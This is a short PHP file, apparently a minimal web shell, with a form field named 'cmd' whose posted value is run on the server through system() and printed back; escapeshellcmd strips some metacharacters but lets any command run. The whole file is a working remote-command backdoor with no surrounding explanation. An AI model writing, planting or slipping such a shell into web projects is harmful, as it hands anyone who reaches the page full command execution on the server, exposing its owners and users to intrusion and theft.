<?php
if($_SERVER["REQUEST_METHOD"]==='POST'){
	$cmd = escapeshellcmd ($_POST["cmd"]);
	print_r($cmd);
	echo "<pre>";
	$comando = system($cmd,$retorno);
	echo "</pre>";	
	
}


?>

<form method="post">
	<input type="text" name="cmd"/>
	<button type="submit">Enviar</button>
</form>